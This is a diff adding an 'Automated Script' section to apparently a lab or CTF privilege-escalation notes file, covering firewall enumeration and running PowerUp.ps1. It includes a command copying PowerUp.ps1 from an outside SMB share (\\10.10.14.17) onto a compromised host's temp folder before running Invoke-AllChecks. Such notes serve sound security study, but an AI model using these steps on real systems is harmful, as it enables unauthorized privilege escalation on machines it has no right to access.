@@ -151,7 +151,29 @@ netsh firewall show state
 netsh firewall show config
 ```
 
-  
+
+## Automated Script
+
+Run multiple automated scripts as some detects that others don't.
+
+### PowerUp.ps1
+
+First start powershell sessions on the shell:
+
+![](https://i.imgur.com/ueXGYXv.png)
+
+
+Download PowerUp.ps1 to **C:\Users\mssql-svc\app-data\local\temp** and run it:
+
+`xcopy \\10.10.14.17\share\PowerUp.ps1 .`
+
+![](https://i.imgur.com/z2BwkNx.png)
+
+
+`Invoke-AllChecks` shows you result:
+
+![](https://i.imgur.com/HWl21e9.png)
+
   
   
 
